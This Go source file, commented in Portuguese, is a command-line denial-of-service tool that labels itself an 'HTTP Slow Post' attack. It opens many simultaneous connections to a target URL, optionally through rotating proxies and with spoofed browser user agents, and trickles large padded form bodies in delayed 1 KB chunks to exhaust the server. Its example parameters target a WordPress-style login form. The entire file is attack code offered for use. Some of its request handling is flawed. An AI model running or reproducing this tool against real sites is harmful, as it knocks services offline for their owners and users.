
package main

import (
    "context"
    "os"
	"io"
	"bytes"
    "strings"
    "flag"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "time"
    "path/filepath"
)

var (
    targetURL      	string
    numConnections 	int
	params		 	string
	paramsParsed	map[string]string
    proxies        	[]string
	delay		 	string
	bodysize	 	int
	delaySend	 	string
    processTimeout  string 
    userAgents 		= []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    }
)

// Function to parse parameters and replace `AUTO` with a Unicode string
func parseParams(paramStr string, bodySize int) map[string]string {
	params := make(map[string]string)
	paramPairs := strings.Split(paramStr, "&")
	paramSize := calculateParamSize(bodySize, params)
	for _, pair := range paramPairs {
		parts := strings.SplitN(pair, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := parts[0], parts[1]
		if value == "AUTO" {
			value = generateUnicodeString(paramSize) // Adjust size as needed
		}
		params[key] = value
	}
	return params
}


func init() {
    // Definir flags para a URL, número de threads e proxies
    flag.StringVar(&targetURL, "url", "", "URL do servidor alvo (obrigatório)")
	flag.StringVar(&params, "params", "", "The POST parameters (e.g., log=AUTO&pwd=AUTO&rememberme=1&...) (Obrigatório)")
    flag.IntVar(&numConnections, "workers", 50, "Número de conexões simultâneas")
    flag.StringVar(&delaySend, "delay", "500ms", "Atraso para o envio de cada byte post (ex: 500ms, 1s)")
	proxiesInput := flag.String("proxies", "", "Lista de proxies separados por vírgula (ex: http://proxy1:port,http://proxy2:port)")
    flag.StringVar(&processTimeout, "process-timeout", "2m", "Tempo total do processo (ex: 5m, 1h)")
	flag.IntVar(&bodysize, "bodysize", 127*1024, "Tamanho do corpo da requisição em bytes")
    // Parsear os argumentos da linha de comando
    flag.Parse()

    // Validar se a URL foi fornecida
    if targetURL == "" {
        fmt.Println("A URL do servidor alvo é obrigatória.")
        flag.Usage()
        os.Exit(1)
    }

    // Separar os proxies pela vírgula se fornecidos
    if *proxiesInput != "" {
        proxies = strings.Split(*proxiesInput, ",")
    }

	if params == "" {
		fmt.Println("Os parâmetros POST são obrigatórios.")
		flag.Usage()
		os.Exit(1)
	}
	// Parse POST parameters
	paramsParsed = parseParams(params, bodysize)
}

func countOpenFiles() int {
    pid := os.Getpid()
    files, _ := filepath.Glob(fmt.Sprintf("/proc/%d/fd/*", pid))
    return len(files)
}

func parseDuration(durationStr string) time.Duration {
    d, err := time.ParseDuration(durationStr)
    if err != nil {
        fmt.Printf("Erro ao parsear duração %s: %v\n", durationStr, err)
        os.Exit(1)
    }
    return d
}

// Function to generate a Unicode string of a specific size (in bytes)
func generateUnicodeString(sizeBytes int) string {
	var builder strings.Builder
	unicodeChar := "你好مرحباこんにちは你" // You can replace this with other Unicode characters
	for builder.Len() < sizeBytes {
		builder.WriteString(unicodeChar)
	}
	return builder.String()[:sizeBytes] // Ensure we only return the exact number of bytes
}

// Function to calculate the size of the body required for each parameter
func calculateParamSize(totalSize int, params map[string]string) int {
	// Calculate the size for each parameter
	// Example: Total size of 127 KB, if there are 2 parameters, each should be about (127 KB - length of separators) / number of parameters
	// Adjust for URL encoding and key lengths
	numParams := len(params)
	if numParams == 0 {
		return 0
	}
	return (totalSize - (numParams * 1)) / numParams // 1 byte for each '&' or '&' for each key-value pair
}


func attack(ctx context.Context, proxyURL string, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
		case <-stopChan:
			return
        default:  
			var bodyBuffer bytes.Buffer

			// Create the request body
			for key, value := range paramsParsed {
				bodyBuffer.WriteString(fmt.Sprintf("%s=%s&", key, value))
			}
			// Remove the trailing '&'
			body := bodyBuffer.String()
			if len(body) > 0 {
				body = body[:bodyBuffer.Len()-1]
			}

            var transport *http.Transport

            proxy, err := url.Parse(proxyURL)
            if err != nil {
                fmt.Println("Erro ao parsear o proxy:", err)
                return
            }

            transport = &http.Transport{
                Proxy: http.ProxyURL(proxy),
            }
            client := &http.Client{
                Transport: transport,
                Timeout:   0,
            }

            req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte("")))
            if err != nil {
                fmt.Println("Erro ao criar a requisição:", err)
                go attack(ctx, proxyURL, stopChan)
                return
            }

            req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

            // Envia a requisição
            resp, err := client.Do(req)
            if err != nil {
                fmt.Printf("Erro ao enviar a requisição (total de arquivos abertos: %d): %v\n", countOpenFiles(), err)
                go attack(ctx, proxyURL, stopChan)
                return
            }
            defer resp.Body.Close()

            fmt.Println("Conexão aberta através do proxy status:", resp.Status)
			fmt.Println("Tamanho Corpo:", len(body))
            // Envia cabeçalhos adicionais para manter a conexão ativa
            for i := 0; i < len(body); i += 1024 {
                select {
                    case <-ctx.Done():
                        return
                    case <-stopChan:
                        return
                    default:
						end := i + 1024
						if end > len(body) {
							end = len(body)
						}
						chunk := body[i:end]
						req.Body = io.NopCloser(bytes.NewBufferString(chunk))

                        _, err := client.Do(req)
                        if err != nil {
                            fmt.Printf("Erro ao manter a conexão (total de arquivos abertos: %d): %v\n", countOpenFiles(), err)
                            go attack(ctx, proxyURL, stopChan)
                            return
                        }
						time.Sleep(parseDuration(delaySend))
                }
            }
			attack(ctx, proxyURL, stopChan)
    }
}
func attack_sem_proxy(ctx  context.Context, stopChan <-chan struct{}) {
    select {
        case <-ctx.Done():
            return
        default:
			var bodyBuffer bytes.Buffer

			// Create the request body
			for key, value := range paramsParsed {
				bodyBuffer.WriteString(fmt.Sprintf("%s=%s&", key, value))
			}
			// Remove the trailing '&'
			body := bodyBuffer.String()
			if len(body) > 0 {
				body = body[:bodyBuffer.Len()-1]
			}


            client := &http.Client{
                Timeout:   0, // Ajuste o tempo conforme necessário
            }

            req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte("")))
            if err != nil {
                fmt.Println("Erro ao criar a requisição:", err)
                go attack_sem_proxy(ctx, stopChan)
                return
            }

            req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Connection", "keep-alive")
            req.Header.Set("Cache-Control", "no-cache")

            // Envia a requisição
            resp, err := client.Do(req)
            if err != nil {
                fmt.Println("Erro ao enviar a requisição:", err)
                go attack_sem_proxy(ctx, stopChan)
                return
            }
            defer resp.Body.Close()

            fmt.Println("Conexão aberta:", resp.Status)
			fmt.Println("Tamanho Corpo:", len(body))
            // Envia cabeçalhos adicionais para manter a conexão ativa
            for i := 0; i < len(body); i += 1024 {
                select {
                    case <-ctx.Done():
                        return
                    case <-stopChan:
                        return
                    default:
                        end := i + 1024
					if end > len(body) {
						end = len(body)
					}
					chunk := body[i:end]
					req.Body = io.NopCloser(bytes.NewBufferString(chunk))

					// Send the request in small chunks with delays
					_, err := client.Do(req)
					if err != nil {
						fmt.Println("Erro ao enviar a requisição:", err)
						go attack_sem_proxy(ctx, stopChan);
						return
					}

					time.Sleep(parseDuration(delaySend))

                }
            }
			attack_sem_proxy(ctx, stopChan)
    }
}
func main() {
    processTimeout := parseDuration(processTimeout)

    ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
    defer cancel()
    stopChan := make(chan struct{})
    fmt.Println("Iniciando ataque HTTP Slow Post em", targetURL)
    for i := 0; i < numConnections; i++ {
        if len(proxies) > 0 {
            go attack(ctx, proxies[rand.Intn(len(proxies))], stopChan)
        } else {
            go attack_sem_proxy(ctx, stopChan) // Sem proxy
        }
    }
    <-ctx.Done()
    // Envia sinal para parar todas as goroutines
    close(stopChan)
    fmt.Println("Processo finalizado.")
    os.Exit(0)
    // Mantém o programa rodando
    //select {}
}
